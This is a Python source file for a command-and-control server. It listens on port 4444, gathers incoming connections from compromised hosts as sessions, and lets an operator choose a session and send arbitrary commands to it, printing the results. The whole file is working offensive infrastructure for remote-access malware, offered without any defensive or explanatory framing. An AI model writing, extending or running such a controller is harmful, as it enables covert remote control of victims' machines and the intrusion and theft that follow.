from termcolor import colored
import threading
import socket
import signal
import sys

class CommandAndControl:
    def __init__(self):
        self.clients = []
        self.session_count = 0
        self.on_session = False
        self.serverSocket = None
        self.clientsThread = None

    def def_handler(self, sig, frame):
        print(colored("\n\n\t[", "yellow"), colored("C&C", "red"), colored("] ", "yellow"), colored("Exiting C&C, closing all clients\n", "red"))

        for sock, addr in self.clients:
            sock.sendall(b"exit")

        self.serverSocket.close()
        sys.exit()

    @staticmethod
    def print_help():
        print(
"""
Commands available:

\t1. exit        --> Close the server
\t2. session id  --> Enter to the session id given
\t3. sessions    --> Show the available sessions on the server
\t4. help        --> Show this help panel
"""
        )

    def handle_connections(self):
        while True:
            conn, addr = self.serverSocket.accept()

            if not self.on_session:
                print(colored("\n\n\t[", "red") + colored("C&C", "cyan") + colored("] ", "red") + colored(f"New Connection From: ", "cyan"), colored(f"{addr}\n", "red"))
                #print(f"\n[*>] New connection from: {addr}\n")

            self.clients.append((conn, addr))
            self.session_count += 1

    def close_client(self, id):
        sock, addr = self.clients[id]
        self.clients.remove(self.clients[id])
        sock.sendall(b"exit")

    def show_sessions(self):
        if not self.clients:
            print(colored("\n\t[", "yellow"), colored("C&C", "red"), colored("] ", "yellow"),colored("Not sessions available", "red"))
            return

        counter = 0
        print(colored("\n\n[", "cyan") + colored(" Showing available sessions ", "red") + colored("] \n", "cyan"))
        for _, addr in self.clients:
            print(colored(f"\t{counter}. ", "red"), colored(f"{addr}", "yellow"))
            counter += 1

        print("\n")

    def set_session(self, command):
        if self.session_count == 0:
            print(colored("\n\t[", "yellow"), colored("C&C", "red"), colored("] ", "yellow"),colored("Not sessions available", "red"))
            return

        id = command.replace("session ", "")
        try:
            if self.session_count < int(id) > self.session_count:
                print(colored("\n\t[", "yellow"), colored("C&C", "red"), colored("] ", "yellow"), colored("Unknown session\n", "red"))

            else:
                print(colored("\n\t[", "cyan") + colored("C&C", "yellow") + colored("] ", "cyan") + colored("Entering session\n", "yellow"))
                self.handle_session(int(id))

        except ValueError as e:
            print(colored("\n\t[", "yellow"), colored("C&C", "red"), colored("] ", "yellow"), colored(f"Error setting session: {e}\n\n", "red"))


    def execute_remotely(self, command, client_socket):
        client_socket.sendall(command.encode())
        size = client_socket.recv(1024).decode()

        try:
            size = int(size)
            command = client_socket.recv(size).decode()
        except ValueError as e:
            print(colored("\n\t[", "yellow"), colored("C&C", "red"), colored("] ", "yellow"),colored("Incorrect size received", "red"))
            command = client_socket.recv(2048).decode()

        print(f"{command}")


    def handle_session(self, session_id):
        client_socket, _ = self.clients[session_id]

        while True:
            command = input(
                colored("[", "red") + colored("C&C", "yellow") + colored("] ", "red") + colored(" >> ","yellow"))

            if command == "exit" or command == "q":
                return

            elif command == "close":
                self.close_client(session_id)
                return

            else:
                self.execute_remotely(command, client_socket)


    def start_handling(self):
        while True:
            command = input(colored("\n[", "red") + colored("C&C", "yellow") + colored("] ", "red") + colored("Enter a command: ", "yellow"))

            if not command:
                continue

            elif command == "exit" or command == "quit":
                self.def_handler(None, None)

            elif command == "sessions":
                self.show_sessions()

            elif "session" in command:
                self.set_session(command)

            elif "help" in command:
                 self.print_help()

            else:
                print(colored("\n\t[", "yellow"), colored("C&C", "red"), colored("] ", "yellow"),
                      colored("Unknown command, enter help.", "red"))

    def start(self):
        signal.signal(signal.SIGINT, self.def_handler)
        self.serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.serverSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.serverSocket.bind(("192.168.131.34", 4444))
        self.serverSocket.listen()

        print("\n[!>] Listening for incomming connection...\n")

        self.clientsThread = threading.Thread(target=self.handle_connections)
        self.clientsThread.daemon = True
        self.clientsThread.start()
        self.start_handling()

def main():
    c2 = CommandAndControl()
    c2.start()

if __name__ == "__main__":
    main()